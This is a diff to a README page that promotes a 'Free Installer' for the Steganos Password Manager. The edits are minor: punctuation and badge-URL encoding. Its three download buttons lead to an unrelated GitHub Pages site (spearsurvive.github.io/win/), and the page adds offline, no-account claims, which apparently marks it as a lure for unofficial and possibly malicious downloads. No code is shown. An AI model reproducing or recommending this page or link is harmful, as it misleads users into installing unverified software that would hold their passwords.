@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Password+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Steganos Password Manager Free Installer** — Steganos Password Manager is a Windows and Android password manager featuring AES-256 encryption, browser integration, secure notes, automatic password generation, and a password health checker — part of the Steganos Privacy Suite ecosystem.. Works without internet access, no account required. Full offline installation.
+**💻 Steganos Password Manager Free Installer** — Steganos Password Manager is a Windows and Android password manager featuring AES-256 encryption, browser integration, secure notes, automatic password generation, and a password health checker — part of the Steganos Privacy Suite ecosystem. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos%20Password%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos+Password+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Steganos Password Manager is a Windows and Android password manager featuring AE
 
 <div align="center">
 
-[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos%20Password%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos+Password+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Steganos Password Manager is a Windows and Android password manager featuring AE
 
 ---
 
-**Steganos Password Manager Free Installer** — Steganos Password Manager is a Windows and Android password manager featuring AES-256 encryption, browser integration, secure notes, automatic password generation, and a password health checker — part of the Steganos Privacy Suite ecosystem.. Install without internet connection today!
+**Steganos Password Manager Free Installer** — Steganos Password Manager is a Windows and Android password manager featuring AES-256 encryption, browser integration, secure notes, automatic password generation, and a password health checker — part of the Steganos Privacy Suite ecosystem. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos%20Password%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Password Manager](https://img.shields.io/badge/⬇_Install_Steganos+Password+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
